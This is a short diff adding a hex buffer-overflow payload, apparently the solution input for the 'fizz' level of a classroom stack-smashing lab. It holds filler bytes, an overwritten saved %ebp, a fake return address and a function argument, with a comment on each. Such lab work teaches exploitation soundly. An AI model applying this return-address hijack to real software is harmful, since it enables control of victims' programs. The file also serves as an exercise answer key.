@@ -1,0 +1,9 @@
+32 32 32 32 32 32 32 32
+32 32 32 32 32 32 32 32
+32 32 32 32 32 32 32 32
+32 32 32 32 32 32 32 32
+32 32 32 32 32 32 32 32
+c0 3a 68 55 /* previous %ebp */
+88 8b 04 08 /* fake return address */
+32 32 32 32 /* unused return address */
+84 3e d1 44  /* argument of function fizz */
